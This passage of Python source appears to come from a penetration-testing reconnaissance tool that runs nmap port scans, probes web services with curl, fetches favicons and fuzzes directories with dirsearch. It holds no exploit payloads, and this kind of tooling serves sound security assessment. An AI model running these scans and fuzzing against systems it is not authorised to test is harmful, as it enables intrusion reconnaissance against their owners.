    command.extend(["nmap", "--open", "-Pn"])
    if targets_are_ipv6_only(targets):
        command.append("-6")
    if args.ports:
        command.extend(["-p", args.ports])
    elif args.full_portscan or profile["top_ports"] is None:
        command.append("-p-")
    else:
        command.extend(["--top-ports", str(profile["top_ports"])])
    command.extend(argument for argument in profile["nmap_args"] if argument != "--open")
    scripts = profile.get("nmap_scripts", [])
    if scripts:
        command.extend(["--script", ",".join(scripts)])
    command.extend([f"-{thread_conf['nmap_timing']}", "-oA", str(output_prefix)])
    for extra in args.nmap_extra:
        command.extend(split_nmap_extra(extra))
    command.extend(targets)
    return command


def build_udp_nmap_command(args: argparse.Namespace, targets: list[str], output_prefix: Path) -> list[str]:
    thread_conf = THREAD_LEVELS[args.threads_level]
    command: list[str] = []
    if args.sudo_nmap:
        command.append("sudo")
    command.extend(
        [
            "nmap",
            "-sU",
            "-sV",
            "--version-light",
            "--open",
            f"-{thread_conf['nmap_timing']}",
            "--top-ports",
            str(args.udp_top_ports),
            "-oA",
            str(output_prefix),
        ]
    )
    if targets_are_ipv6_only(targets):
        command.insert(command.index("nmap") + 1, "-6")
    command.extend(targets)
    return command


def targets_are_ipv6_only(targets: list[str]) -> bool:
    addresses: list[ipaddress.IPv4Address | ipaddress.IPv6Address] = []
    for target in targets:
        try:
            addresses.append(ipaddress.ip_address(target))
            continue
        except ValueError:
            pass
        try:
            addresses.append(ipaddress.ip_network(target, strict=False).network_address)
        except ValueError:
            return False
    return bool(addresses) and all(address.version == 6 for address in addresses)


def split_nmap_extra(value: str) -> list[str]:
    # Keep this intentionally simple: --nmap-extra is repeatable and should
    # normally receive one flag/value per use. If spaces are supplied, split.
    return [part for part in value.split(" ") if part]


def custom_nmap_output_paths(command: list[str]) -> list[Path]:
    outputs: list[Path] = []
    index = 0
    while index < len(command):
        match = re.match(r"^-o([NXGA])(?:=(.*)|(.+))?$", command[index], flags=re.I)
        if not match:
            index += 1
            continue
        kind = match.group(1).upper()
        value = match.group(2) or match.group(3)
        if not value and index + 1 < len(command):
            index += 1
            value = command[index]
        if value:
            output = Path(value)
            if kind == "A":
                outputs.extend(Path(str(output) + suffix) for suffix in (".xml", ".nmap", ".gnmap"))
            else:
                outputs.append(output)
        index += 1
    return outputs


def run_nmap_discovery(args: argparse.Namespace, state: ScanState, targets: list[str], logger: Logger) -> None:
    if args.skip_nmap:
        logger.info("Skipping Nmap discovery by request")
        return
    if not targets:
        run_imported_service_completion(args, state, logger)
        return
    if not has_tool("nmap"):
        logger.warn("Nmap is not installed or not in PATH; skipping discovery")
        return
    output_prefix = Path(state.output_dir) / RAW_DIR / "nmap" / "discovery"
    is_custom_command = False
    custom_targets = [target for target in targets if is_custom_nmap_command(target)]
    if custom_targets and len(targets) != 1:
        raise BirdScanUsageError("Um comando Nmap customizado não pode ser combinado com outros targets.")
    custom_output_paths: list[Path] = []
    if len(targets) == 1 and is_custom_nmap_command(targets[0]):
        is_custom_command = True
        custom_command_str = targets[0].strip()
        logger.info(f"Custom Nmap command detected: {custom_command_str}")
        import shlex as _shlex  # noqa: F811 — local re-import for clarity in custom command parsing
        command = _shlex.split(custom_command_str)
        custom_output_paths = custom_nmap_output_paths(command)
        if custom_output_paths:
            output_prefix = custom_output_paths[0]
        else:
            logger.warn("No -oN, -oX, -oG, or -oA flag found in custom Nmap command. Output parsing may fail.")
    else:
        command = build_nmap_command(args, targets, output_prefix)
    logger.info("Running Nmap discovery")
    timeout = nmap_timeout_for_targets(targets, args)
    result = run_command(
        command,
        timeout=timeout,
        output_file=Path(state.output_dir) / RAW_DIR / "nmap" / "nmap-discovery.command.txt",
        logger=logger,
        secrets=[args.password or "", args.ntlm_hash or ""],
    )
    if result.returncode != 0:
        logger.warn(f"Nmap returned code {result.returncode}; attempting to parse whatever was written")
        if result.returncode == 1 and "sudo" in (result.stderr or "").lower():
            logger.warn("Sudo may have failed. Try --no-sudo-nmap or ensure passwordless sudo for nmap.")
    xml_path = output_prefix.with_suffix(".xml")
    normal_path = output_prefix.with_suffix(".nmap")
    gnmap_path = output_prefix.with_suffix(".gnmap")
    parsed = False
    candidates = custom_output_paths or [xml_path, normal_path, gnmap_path]
    for candidate in candidates:
        if candidate.exists() and candidate.stat().st_size > 0:
            if parse_nmap_file(candidate, state, logger):
                parsed = True
                break
    if not parsed:
        any_file = any(c.exists() and c.stat().st_size > 0 for c in candidates)
        if not any_file:
            logger.warn("Nmap produced no output files. Check if nmap is installed and has permissions (try --no-sudo-nmap).")
        else:
            logger.warn("All Nmap output files were malformed. Results may be incomplete.")
    if args.udp_top_ports:
        udp_prefix = Path(state.output_dir) / RAW_DIR / "nmap" / "udp-discovery"
        udp_command = build_udp_nmap_command(args, targets, udp_prefix)
        logger.info(f"Running optional UDP discovery against top {args.udp_top_ports} UDP ports")
        udp_result = run_command(
            udp_command,
            timeout=nmap_timeout_for_targets(targets, args),
            output_file=Path(state.output_dir) / RAW_DIR / "nmap" / "nmap-udp-discovery.command.txt",
            logger=logger,
            secrets=[args.password or "", args.ntlm_hash or ""],
        )
        if udp_result.returncode != 0:
            logger.warn(f"UDP Nmap returned code {udp_result.returncode}; attempting to parse whatever was written")
        for candidate in [udp_prefix.with_suffix(".xml"), udp_prefix.with_suffix(".nmap"), udp_prefix.with_suffix(".gnmap")]:
            if candidate.exists() and candidate.stat().st_size > 0:
                if parse_nmap_file(candidate, state, logger):
                    break
    save_state(state)


def run_imported_service_completion(args: argparse.Namespace, state: ScanState, logger: Logger) -> None:
    if not state.services:
        logger.info("No direct targets or imported services supplied for Nmap discovery")
        return
    if not has_tool("nmap"):
        logger.warn("Nmap is not installed or not in PATH; skipping imported service completion")
        return
    services_by_host: dict[str, set[int]] = {}
    for service in state.services:
        if service.protocol != "tcp" or not (1 <= service.port <= 65535):
            continue
        services_by_host.setdefault(service.ip, set()).add(service.port)
    if not services_by_host:
        logger.info("No TCP imported services available for Nmap completion")
        return
    logger.info("Running Nmap service completion on imported host:port data")
    raw_dir = Path(state.output_dir) / RAW_DIR / "nmap" / "completion"
    raw_dir.mkdir(parents=True, exist_ok=True)
    for host, ports in sorted(services_by_host.items(), key=lambda item: ip_sort_key(item[0])):
        port_list = ",".join(str(port) for port in sorted(ports))
        output_prefix = raw_dir / f"completion_{safe_filename(host)}"
        completion_args = argparse.Namespace(**vars(args))
        completion_args.ports = port_list
        completion_args.full_portscan = False
        command = build_nmap_command(completion_args, [host], output_prefix)
        result = run_command(
            command,
            timeout=max(240, min(3600, 45 * len(ports))),
            output_file=raw_dir / f"completion_{safe_filename(host)}.command.txt",
            logger=logger,
            secrets=[args.password or "", args.ntlm_hash or ""],
        )
        if result.returncode not in {0, 1}:
            logger.warn(f"Nmap completion returned code {result.returncode} for {host}; attempting to parse written output")
        for candidate in [output_prefix.with_suffix(".xml"), output_prefix.with_suffix(".gnmap"), output_prefix.with_suffix(".nmap")]:
            if candidate.exists() and candidate.stat().st_size > 0:
                parse_nmap_file(candidate, state, logger)
                break
    save_state(state)


def nmap_timeout_for_targets(targets: list[str], args: argparse.Namespace) -> int:
    base = {1: 1800, 2: 1800, 3: 2400, 4: 3600, 5: 5400}[args.threads_level]
    if args.full_portscan or args.profile == "deep":
        base *= 2
    target_bonus = min(len(targets), 64) * 30
    return base + target_bonus


def web_paths(args: argparse.Namespace) -> list[str]:
    profile_limit = PROFILE_DEFAULTS[args.profile]["web_fuzz_limit"]
    paths: list[str] = []
    for item in COMMON_WEB_PATHS[:profile_limit]:
        add_web_path(paths, item)
    if not args.no_web_common_wordlist:
        common_limit = args.web_common_limit if args.web_common_limit is not None else WEB_COMMON_LIMITS.get(args.profile, 120)
        common_wordlist = first_existing_common_web_wordlist()
        if common_wordlist:
            load_web_paths_from_wordlist(common_wordlist, paths, limit=common_limit)
    for extra in args.web_path:
        for item in split_target_values(extra):
            add_web_path(paths, item)
    if args.web_wordlist:
        wordlist = Path(args.web_wordlist)
        if not wordlist.exists():
            raise BirdScanUsageError(f"Wordlist web inválida ou inexistente: {wordlist}")
        load_web_paths_from_wordlist(wordlist, paths, limit=args.web_custom_limit)
    return paths


def first_existing_common_web_wordlist() -> Path | None:
    for candidate in COMMON_WEB_WORDLIST_CANDIDATES:
        path = Path(candidate)
        if path.is_file() and path.stat().st_size > 0:
            return path
    return None


def load_web_paths_from_wordlist(path: Path, paths: list[str], limit: int | None = None) -> int:
    if limit is not None and limit <= 0:
        return 0
    added = 0
    for line in path.read_text(encoding="utf-8", errors="replace").splitlines():
        item = normalize_target_token(line)
        if add_web_path(paths, item):
            added += 1
            if limit is not None and added >= max(0, limit):
                break
    return added


def add_web_path(paths: list[str], item: str) -> bool:
    item = normalize_web_path(item)
    if not item or item in paths:
        return False
    paths.append(item)
    return True


def normalize_web_path(item: str) -> str:
    item = normalize_target_token(item)
    if not item:
        return ""
    if item.startswith(("http://", "https://")):
        parsed = urllib.parse.urlparse(item)
        item = parsed.path or "/"
        if parsed.query:
            item += "?" + parsed.query
    if item.startswith("?"):
        item = "/" + item
    if not item.startswith("/"):
        item = "/" + item
    item = re.sub(r"/{2,}", "/", item)
    if len(item) > 240:
        return ""
    return item


def services_for_web_probe(state: ScanState) -> list[ServiceRecord]:
    seen: set[tuple[str, int, str]] = set()
    selected: list[ServiceRecord] = []
    for service in state.services:
        if service.protocol != "tcp":
            continue
        key = (service.ip, service.port, service.protocol)
        if key not in seen:
            selected.append(service)
            seen.add(key)
    return selected


def add_web_endpoint(state: ScanState, endpoint: WebEndpoint) -> bool:
    if not has_http_response(endpoint):
        return False
    for existing in state.web_endpoints:
        if existing.url == endpoint.url:
            for field_name in endpoint.__dataclass_fields__:
                setattr(existing, field_name, getattr(endpoint, field_name))
            return True
    state.web_endpoints.append(endpoint)
    return True


def run_web_catalog(args: argparse.Namespace, state: ScanState, logger: Logger) -> None:
    if args.skip_web or args.service_enum_only:
        logger.info("Skipping web catalog")
        return
    services = services_for_web_probe(state)
    if not services:
        logger.info("No services available for web probing")
        return
    if not has_tool("curl"):
        logger.warn("curl is not installed or not in PATH; skipping web catalog")
        return
    thread_conf = THREAD_LEVELS[args.threads_level]
    timeout = args.web_timeout or thread_conf["timeout"]
    workers = min(thread_conf["workers"], max(1, len(services) * 2))
    logger.info(f"Cataloging web endpoints on {len(services)} open TCP ports with {workers} workers")
    jobs: list[tuple[ServiceRecord, str, str]] = []
    for service in services:
        for scheme in ("http", "https"):
            jobs.append((service, scheme, "/"))
    logger.info(f"Probing {len(jobs)} HTTP/HTTPS root combinations across all discovered TCP IP:port pairs")
    endpoints: list[WebEndpoint] = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
        future_map = {}
        delay = thread_conf["rate_delay"]
        for service, scheme, path in jobs:
            future = executor.submit(probe_web_endpoint, args, state, service, scheme, path, timeout, logger)
            future_map[future] = (service, scheme, path)
            if delay:
                time.sleep(delay)
        for future in concurrent.futures.as_completed(future_map):
            try:
                endpoint = future.result()
            except Exception as exc:
                service, scheme, path = future_map[future]
                logger.warn(f"Web probe failed for {service.ip}:{service.port} {scheme}{path}: {type(exc).__name__}")
                continue
            if endpoint and has_http_response(endpoint):
                update_service_from_web_endpoint(state, endpoint)
                endpoints.append(endpoint)
                add_web_endpoint(state, endpoint)
                maybe_add_web_evidence(endpoint, state)
    run_dirsearch_fuzzing(args, state, services, timeout, logger)
    if args.web_screenshots:
        run_web_screenshots(args, state, logger)
    save_state(state)


def run_dirsearch_fuzzing(
    args: argparse.Namespace,
    state: ScanState,
    services: list[ServiceRecord],
    timeout: int,
    logger: Logger,
) -> None:
    roots = active_web_roots_for_services(services, state.web_endpoints)
    if not roots:
        logger.info("No HTTP/HTTPS roots returned an HTTP status; skipping web fuzzing")
        return
    if not has_tool("dirsearch"):
        logger.warn("dirsearch is not installed or not in PATH; skipping web fuzzing")
        return
    thread_count = dirsearch_thread_count(args)
    wordlist = None if args.deep_fuzz else write_dirsearch_wordlist(args, state)
    raw_dir = Path(state.output_dir) / RAW_DIR / "web" / "dirsearch"
    raw_dir.mkdir(parents=True, exist_ok=True)
    seen_urls = {endpoint.url for endpoint in state.web_endpoints}
    logger.info(f"Running dirsearch fuzzing against {len(roots)} WEB roots with {thread_count} threads")
    for root in roots:
        root_url = root.url
        parsed_root = urllib.parse.urlparse(root_url)
        slug = safe_filename(f"{parsed_root.scheme}_{parsed_root.netloc}")
        output_file = raw_dir / f"dirsearch_{slug}.txt"
        command = build_dirsearch_command(args, root_url, output_file, wordlist, thread_count, timeout)
        result = run_command(
            command,
            timeout=dirsearch_total_timeout(args),
            output_file=raw_dir / f"dirsearch_{slug}.command.txt",
            logger=logger,
            secrets=[args.password or "", args.ntlm_hash or ""],
        )
        if result.returncode not in {0, 1}:
            logger.warn(f"dirsearch returned code {result.returncode} for {root_url}; attempting to parse available output")
        result_text = "\n".join(
            [
                result.stdout,
                result.stderr,
                read_limited_text(output_file, limit=WEB_MAX_BODY_BYTES),
            ]
        )
        for status, url in parse_dirsearch_results(result_text)[:DIRSEARCH_MAX_RESULTS_PER_BASE]:
            parsed = urllib.parse.urlparse(url)
            if parsed.scheme not in {"http", "https"}:
                continue
            if normalize_fuzz_root_url(url) != root_url:
                logger.debug(f"Skipping dirsearch result outside root {root_url}: {url}")
                continue
            path = urllib.parse.urlunparse(("", "", parsed.path or "/", "", parsed.query, ""))
            fallback_endpoint = web_endpoint_from_dirsearch_result(root, url, status)
            if fallback_endpoint is None or fallback_endpoint.url in seen_urls:
                continue
            probed_endpoint = probe_web_endpoint(
                args,
                state,
                ServiceRecord(ip=root.ip, port=root.port, protocol="tcp"),
                parsed.scheme,
                path,
                timeout,
                logger,
            )
            endpoint = probed_endpoint if probed_endpoint and has_http_response(probed_endpoint) else fallback_endpoint
            if has_http_response(endpoint):
                update_service_from_web_endpoint(state, endpoint)
                endpoint.interesting = endpoint.interesting or is_interesting_fuzz_result(endpoint)
                endpoint.finding_reason = endpoint.finding_reason or "dirsearch result"
                add_web_endpoint(state, endpoint)
                seen_urls.add(endpoint.url)
                maybe_add_web_evidence(endpoint, state)


def build_dirsearch_command(
    args: argparse.Namespace,
    root_url: str,
    output_file: Path,
    wordlist: Path | None,
    thread_count: int,
    timeout: int,
) -> list[str]:
    extensions = DEEP_FUZZ_EXTENSIONS_CSV if args.deep_fuzz else DASHBOARD_EXTENSIONS_CSV
    command = [
        "dirsearch",
        "-u",
        root_url,
        "--full-url",
        "--crawl",
        "-t",
        str(thread_count),
        "--timeout",
        str(max(1, min(timeout, 30))),
        "--user-agent",
        args.user_agent,
        "-e",
        extensions,
    ]
    if args.deep_fuzz:
        command.extend(["-m", "GET", "-f"])
    elif wordlist:
        command.extend(["-w", str(wordlist)])
    command.extend(["-o", str(output_file)])
    if args.proxy:
        command.extend(["--proxy", args.proxy])
    return command


def dirsearch_thread_count(args: argparse.Namespace) -> int:
    return max(1, int(THREAD_LEVELS[args.threads_level]["workers"]))


def dirsearch_total_timeout(args: argparse.Namespace) -> int:
    profile_timeout = {"fast": 180, "safe": 300, "balanced": 600, "deep": 1200}.get(args.profile, 300)
    return max(profile_timeout, min(3600, 120 + dirsearch_thread_count(args) * 60))


def write_dirsearch_wordlist(args: argparse.Namespace, state: ScanState) -> Path | None:
    paths = [path for path in web_paths(args) if path and path != "/"]
    if not paths:
        return None
    wordlist = Path(state.output_dir) / RAW_DIR / "web" / "dirsearch-wordlist.txt"
    wordlist.parent.mkdir(parents=True, exist_ok=True)
    values = [path.lstrip("/") or path for path in paths]
    private_write_text(wordlist, "\n".join(dedupe_text(values)) + "\n")
    return wordlist


def active_web_roots_for_services(services: list[ServiceRecord], endpoints: list[WebEndpoint]) -> list[WebRoot]:
    service_keys = {(service.ip, service.port) for service in services if service.protocol == "tcp"}
    roots: list[WebRoot] = []
    seen: set[tuple[str, str, int, str]] = set()
    active_endpoints = sorted(
        [endpoint for endpoint in endpoints if (endpoint.ip, endpoint.port) in service_keys and has_http_response(endpoint)],
        key=lambda item: (ip_sort_key(item.ip), item.port, item.scheme, item.url),
    )
    for endpoint in active_endpoints:
        root_url = normalize_fuzz_root_url(endpoint.url)
        if not root_url:
            continue
        key = (root_url, endpoint.ip, endpoint.port, endpoint.scheme)
        if key in seen:
            continue
        roots.append(WebRoot(url=root_url, ip=endpoint.ip, port=endpoint.port, scheme=endpoint.scheme))
        seen.add(key)
    return roots


def web_roots_for_services(services: list[ServiceRecord], endpoints: list[WebEndpoint]) -> list[WebRoot]:
    endpoints_by_host_port = group_web_by_host_port(endpoints)
    roots: list[WebRoot] = []
    seen_services: set[tuple[str, int]] = set()
    for service in sorted([item for item in services if is_web_service(item)], key=lambda item: (ip_sort_key(item.ip), item.port)):
        service_key = (service.ip, service.port)
        if service_key in seen_services:
            continue
        preferred_scheme = preferred_scheme_for_service(service)
        candidates: list[tuple[int, WebRoot]] = []
        for endpoint in endpoints_by_host_port.get((service.ip, service.port), []):
            if not is_reportable_web_endpoint(endpoint):
                continue
            root_url = normalize_fuzz_root_url(endpoint.url)
            if root_url:
                scheme_penalty = 0 if endpoint.scheme == preferred_scheme else 1
                status_penalty = 0 if endpoint.status_code in {200, 201, 202, 204, 301, 302, 307, 308, 401, 403} else 1
                candidates.append((scheme_penalty + status_penalty, WebRoot(url=root_url, ip=service.ip, port=service.port, scheme=endpoint.scheme)))
        if candidates:
            root = sorted(candidates, key=lambda item: (item[0], item[1].scheme))[0][1]
        else:
            root = WebRoot(url=build_url(preferred_scheme, service.ip, service.port, "/"), ip=service.ip, port=service.port, scheme=preferred_scheme)
        roots.append(root)
        seen_services.add(service_key)
    return roots


def preferred_scheme_for_service(service: ServiceRecord) -> str:
    descriptor = f"{service.service} {service.product} {service.version} {service.banner}".lower()
    if service.port in {443, 8443, 9443, 5986, 2376}:
        return "https"
    if any(token in descriptor for token in ["https", "ssl", "tls"]):
        return "https"
    return "http"


def web_catalog_endpoints(services: list[ServiceRecord], endpoints: list[WebEndpoint]) -> list[WebEndpoint]:
    catalog = [endpoint for endpoint in endpoints if is_reportable_web_endpoint(endpoint)]
    seen = {endpoint.url for endpoint in catalog}
    for endpoint in web_root_catalog_endpoints(services, endpoints):
        if endpoint.url not in seen:
            catalog.append(endpoint)
            seen.add(endpoint.url)
    return sorted(catalog, key=lambda item: (ip_sort_key(item.ip), item.port, item.scheme, item.path, item.url))


def web_root_catalog_endpoints(services: list[ServiceRecord], endpoints: list[WebEndpoint]) -> list[WebEndpoint]:
    endpoints_by_url = {endpoint.url: endpoint for endpoint in endpoints if is_reportable_web_endpoint(endpoint)}
    roots: list[WebEndpoint] = []
    for root in web_roots_for_services(services, endpoints):
        existing = endpoints_by_url.get(root.url)
        if existing:
            roots.append(existing)
            continue
        roots.append(
            WebEndpoint(
                url=root.url,
                ip=root.ip,
                port=root.port,
                scheme=root.scheme,
                path="/",
                status_code=0,
                title="WEB port discovered",
                finding_reason="WEB port discovered without reportable HTTP root response",
            )
        )
    return sorted(roots, key=lambda item: (ip_sort_key(item.ip), item.port, item.scheme, item.url))


def parse_dirsearch_results(text: str) -> list[tuple[int, str]]:
    results: list[tuple[int, str]] = []
    for line in text.splitlines():
        status_match = re.search(r"\b([1-5]\d{2})\b", line)
        url_match = re.search(r"https?://[^\s\"'<>]+", line)
        if not status_match or not url_match:
            continue
        status = parse_int(status_match.group(1))
        url = url_match.group(0).rstrip("),.;")
        if 100 <= status <= 599 and is_valid_web_url(url):
            results.append((status, url))
    deduped: list[tuple[int, str]] = []
    seen: set[str] = set()
    for status, url in results:
        if url in seen:
            continue
        seen.add(url)
        deduped.append((status, url))
    return deduped


def web_endpoint_from_dirsearch_result(root: WebRoot, url: str, status: int) -> WebEndpoint | None:
    if not is_valid_web_url(url) or not (100 <= status <= 599):
        return None
    parsed = urllib.parse.urlparse(url)
    path = urllib.parse.urlunparse(("", "", parsed.path or "/", "", parsed.query, ""))
    endpoint = WebEndpoint(
        url=url,
        ip=root.ip,
        port=root.port,
        scheme=parsed.scheme,
        path=path,
        status_code=status,
        title="dirsearch result",
        interesting=False,
        finding_reason="dirsearch result",
    )
    endpoint.interesting, endpoint.finding_reason = classify_web_endpoint(endpoint)
    endpoint.finding_reason = endpoint.finding_reason or "dirsearch result"
    return endpoint


def update_service_from_web_endpoint(state: ScanState, endpoint: WebEndpoint) -> None:
    service = state.find_service(endpoint.ip, endpoint.port, "tcp")
    if not service:
        return
    if not service.service or service.service == "unknown" or service_group_name(service) == "OTHER":
        service.service = "https" if endpoint.scheme == "https" else "http"
    if endpoint.server and not service.product:
        service.product = endpoint.server[:120]


def web_origin(url: str) -> tuple[str, str, int] | None:
    try:
        parsed = urllib.parse.urlsplit(url)
        if parsed.scheme not in {"http", "https"} or not parsed.hostname:
            return None
        if parsed.username is not None or parsed.password is not None:
            return None
        return parsed.scheme, parsed.hostname.lower(), parsed.port or (443 if parsed.scheme == "https" else 80)
    except ValueError:
        return None


def run_scoped_web_request(command: list[str], *, follow: bool, max_redirects: int, timeout: int,
                           output_file: Path, logger: Logger, secrets: Iterable[str] = ()) -> CommandResult:
    """Follow redirects only within the original origin, with a total time budget."""
    origin = web_origin(command[-1])
    if origin is None:
        raise BirdScanUsageError("URL HTTP inválida")
    current = command[-1]
    visited = {current}
    deadline = time.monotonic() + timeout
    for hop in range(max_redirects + 1):
        remaining = max(0.1, deadline - time.monotonic())
        request = [*command[:-1], current]
        if "--max-time" in request:
            request[request.index("--max-time") + 1] = str(remaining)
        result = run_command(request, timeout=remaining, output_file=output_file, logger=logger, secrets=secrets)
        meta = parse_curl_meta(result.stdout)
        if result.returncode or not follow or meta.get("status_code") not in {301, 302, 303, 307, 308}:
            return result
        destination = urllib.parse.urljoin(current, meta.get("redirect_url", ""))
        if web_origin(destination) != origin:
            logger.info("Redirect externo não seguido; resposta original preservada.")
            return result
        if hop == max_redirects or destination in visited or time.monotonic() >= deadline:
            return result
        visited.add(destination)
        current = destination
    return result


def probe_web_endpoint(
    args: argparse.Namespace,
    state: ScanState,
    service: ServiceRecord,
    scheme: str,
    path: str,
    timeout: int,
    logger: Logger,
) -> WebEndpoint | None:
    url = build_url(scheme, service.ip, service.port, path)
    raw_base = safe_filename(f"{scheme}_{service.ip}_{service.port}_{path.strip('/') or 'root'}")
    raw_dir = Path(state.output_dir) / RAW_DIR / "web"
    headers_file = raw_dir / f"{raw_base}.headers"
    body_file = raw_dir / f"{raw_base}.body"
    meta_file = raw_dir / f"{raw_base}.meta"
    command = [
        "curl",
        "--silent",
        "--show-error",
        "--insecure",
        "--connect-timeout",
        str(max(1, min(timeout, 10))),
        "--max-time",
        str(timeout),
        "--user-agent",
        args.user_agent,
        "--dump-header",
        str(headers_file),
        "--output",
        str(body_file),
        "--write-out",
        "BIRDSCAN_META:%{response_code}|%{url_effective}|%{content_type}|%{redirect_url}|%{size_download}",
        "--max-filesize",
        str(WEB_MAX_BODY_BYTES),
    ]
    if args.proxy:
        command.extend(["--proxy", args.proxy])
    command.append(url)
    result = run_scoped_web_request(
        command,
        follow=not args.no_follow_redirects,
        max_redirects=5,
        timeout=timeout,
        output_file=meta_file,
        logger=logger,
        secrets=[args.password or "", args.ntlm_hash or ""],
    )
    if result.returncode != 0 and not headers_file.exists():
        cleanup_empty_file(body_file)
        return None
    meta = parse_curl_meta(result.stdout)
    headers = parse_headers_file(headers_file)
    body_sample = read_limited_text(body_file, limit=262144)
    status_code = meta.get("status_code", 0) or status_from_headers(headers)
    if not status_code:
        cleanup_empty_file(body_file)
        return None
    title = extract_title(body_sample)
    server = header_lookup(headers, "server")
    content_type = meta.get("content_type") or header_lookup(headers, "content-type")
    response_size = response_size_for_body(body_file, meta)
    content_length = header_int(headers, "content-length")
    technologies = detect_web_technologies(headers, body_sample)
    favicon_url = ""
    favicon_file = ""
    if path == "/":
        favicon_url, favicon_file = fetch_favicon(args, state, url, body_sample, timeout, logger)
    endpoint = WebEndpoint(
        url=url,
        ip=service.ip,
        port=service.port,
        scheme=scheme,
        path=path,
        status_code=int(status_code),
        title=title,
        server=server,
        content_type=content_type,
        response_size=response_size,
        content_length=content_length,
        redirect_url=meta.get("url_effective", ""),
        headers=headers,
        technologies=technologies,
        interesting=False,
        raw_headers_file=relpath(headers_file, state.output_dir) if headers_file.exists() else "",
        body_sample_file=relpath(body_file, state.output_dir) if body_file.exists() else "",
        favicon_url=favicon_url,
        favicon_file=favicon_file,
    )
    endpoint.interesting, endpoint.finding_reason = classify_web_endpoint(endpoint)
    return endpoint


def cleanup_empty_file(path: Path) -> None:
    try:
        if path.exists() and path.stat().st_size == 0:
            path.unlink()
    except OSError:
        pass


def build_url(scheme: str, host: str, port: int, path: str = "/") -> str:
    if ":" in host and not host.startswith("["):
        host = f"[{host}]"
    default_port = 443 if scheme == "https" else 80
    port_part = "" if port == default_port else f":{port}"
    if not path.startswith("/"):
        path = "/" + path
    return f"{scheme}://{host}{port_part}{path}"


def parse_curl_meta(stdout: str) -> dict[str, Any]:
    matches = re.findall(r"BIRDSCAN_META:(\d{3})\|([^|]*)\|([^|]*)\|([^|\n\r]*)\|?([^\n\r]*)", stdout or "")
    if not matches:
        return {}
    code, effective, content_type, redirect, size_download = matches[-1]
    return {
        "status_code": int(code),
        "url_effective": effective.strip(),
        "content_type": content_type.strip(),
        "redirect_url": redirect.strip(),
        "size_download": parse_int(size_download),
    }


def parse_headers_file(path: Path) -> dict[str, str]:
    if not path.exists():
        return {}
    text = path.read_text(encoding="utf-8", errors="replace")
    blocks = re.split(r"\r?\n\r?\n", text.strip())
    selected = blocks[-1] if blocks else text
    headers: dict[str, str] = {}
    lines = selected.splitlines()
    if lines:
        headers[":status"] = lines[0].strip()
    for line in lines[1:]:
        if ":" not in line:
            continue
        key, value = line.split(":", 1)
        key = key.strip()
        value = value.strip()
        if key:
            headers[key] = value
    return headers


def status_from_headers(headers: dict[str, str]) -> int:
    status = headers.get(":status", "")
    match = re.search(r"\s(\d{3})(?:\s|$)", status)
    if match:
        return int(match.group(1))
    return 0


def parse_int(value: Any) -> int:
    try:
        return int(float(str(value).strip()))
    except (TypeError, ValueError):
        return 0


def header_int(headers: dict[str, str], name: str) -> int:
    value = header_lookup(headers, name)
    return parse_int(value)


def response_size_for_body(path: Path, meta: dict[str, Any]) -> int:
    try:
        if path.exists():
            return int(path.stat().st_size)
    except OSError:
        pass
    return parse_int(meta.get("size_download", 0))


def read_limited_text(path: Path, limit: int = 262144) -> str:
    if not path.exists():
        return ""
    with path.open("rb") as handle:
        data = handle.read(limit)
    return data.decode("utf-8", errors="replace")


def extract_title(body: str) -> str:
    if not body:
        return ""
    match = re.search(r"<title[^>]*>(.*?)</title>", body, flags=re.I | re.S)
    if not match:
        return ""
    title = re.sub(r"\s+", " ", match.group(1)).strip()
    return html.unescape(title)[:240]


def fetch_favicon(
    args: argparse.Namespace,
    state: ScanState,
    base_url: str,
    body_sample: str,
    timeout: int,
    logger: Logger,
) -> tuple[str, str]:
    raw_dir = Path(state.output_dir) / RAW_DIR / "web" / "favicons"
    raw_dir.mkdir(parents=True, exist_ok=True)
    for favicon_url in favicon_candidate_urls(base_url, body_sample)[:4]:
        parsed = urllib.parse.urlparse(favicon_url)
        suffix = Path(parsed.path).suffix.lower()
        if suffix not in {".ico", ".png", ".svg", ".jpg", ".jpeg", ".gif", ".webp"}:
            suffix = ".ico"
        slug = safe_filename(f"{parsed.scheme}_{parsed.netloc}_{parsed.path.strip('/') or 'favicon'}")
        if not Path(slug).suffix:
            slug += suffix
        icon_file = raw_dir / slug
        meta_file = raw_dir / f"{slug}.command.txt"
        command = [
            "curl",
            "--silent",
            "--show-error",
            "--insecure",
            "--connect-timeout",
            str(max(1, min(timeout, 10))),
            "--max-time",
            str(max(1, timeout)),
            "--user-agent",
            args.user_agent,
            "--output",
            str(icon_file),
            "--write-out",
            "BIRDSCAN_META:%{response_code}|%{url_effective}|%{content_type}|%{redirect_url}|%{size_download}",
            "--max-filesize",
            "262144",
        ]
        if args.proxy:
            command.extend(["--proxy", args.proxy])
        command.append(favicon_url)
        
        result = run_scoped_web_request(command, follow=not args.no_follow_redirects,
                                        max_redirects=3, timeout=timeout, output_file=meta_file, logger=logger)
        meta = parse_curl_meta(result.stdout)
        status_code = int(meta.get("status_code", 0) or 0)
        content_type = str(meta.get("content_type", ""))
        if (
            result.returncode == 0
            and 200 <= status_code < 300
            and icon_file.exists()
            and icon_file.stat().st_size > 0
            and is_probable_favicon(content_type, favicon_url)
        ):
            return favicon_url, relpath(icon_file, state.output_dir)
        cleanup_empty_file(icon_file)
        try:
            if icon_file.exists():
                icon_file.unlink()
        except OSError:
            pass
    return "", ""


def favicon_candidate_urls(base_url: str, body_sample: str) -> list[str]:
    candidates: list[str] = []
    for tag in re.findall(r"<link\b[^>]*>", body_sample or "", flags=re.I):
        rel = html_attr_value(tag, "rel").lower()
        href = html_attr_value(tag, "href")
        if "icon" in rel and href:
            candidates.append(urllib.parse.urljoin(base_url, html.unescape(href)))
    candidates.append(urllib.parse.urljoin(base_url, "/favicon.ico"))
    origin = web_origin(base_url)
    return dedupe_text(
        [
            url
            for url in candidates
            if origin is not None and web_origin(url) == origin
        ]
    )


def html_attr_value(tag: str, name: str) -> str:
    match = re.search(rf"\b{re.escape(name)}\s*=\s*(['\"])(.*?)\1", tag, flags=re.I | re.S)
    if match:
        return match.group(2).strip()
    match = re.search(rf"\b{re.escape(name)}\s*=\s*([^\s>]+)", tag, flags=re.I)
    return match.group(1).strip("'\"") if match else ""


def is_probable_favicon(content_type: str, url: str) -> bool:
    ctype = content_type.lower()
    if any(token in ctype for token in ["image/", "icon", "svg"]):
        return True
    suffix = Path(urllib.parse.urlparse(url).path).suffix.lower()
    return suffix in {".ico", ".png", ".svg", ".jpg", ".jpeg", ".gif", ".webp"}


